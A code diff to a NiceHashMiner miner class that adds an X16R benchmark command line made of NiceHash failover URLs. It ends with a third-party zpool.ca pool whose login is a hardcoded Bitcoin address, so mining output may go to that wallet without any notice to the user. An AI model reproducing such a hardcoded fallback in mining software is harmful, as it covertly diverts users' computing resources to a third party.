@@ -82,6 +82,24 @@ namespace NiceHashMiner.Miners
             var commandLine = "";
             var timeLimit = (_benchmarkException) ? "" : " --time-limit 300";
 
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.X16R))
+            {
+                _benchmarkTimeWait = 180;
+                commandLine = " --algo=" + algorithm.AlgorithmName +
+                " --url=" + url + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + Form_Main.myServers[1, 0] + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + Form_Main.myServers[2, 0] + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + Form_Main.myServers[3, 0] + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + "." + Form_Main.myServers[0, 0] + ".nicehash.com:" + port + " --userpass=" + username + ":x" +
+                " --url=" + url + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://x16r.eu.mine.zpool.ca:3636" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2:c=BTC " +
+                              timeLimit + " --api-bind-http=" + ApiPort + " " +
+                              ExtraLaunchParametersParser.ParseForMiningSetup(
+                                  MiningSetup,
+                                  DeviceType.NVIDIA) +
+                              " --no-color --devices ";
+            }
+
             if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.X16RV2))
             {
                 _benchmarkTimeWait = time;
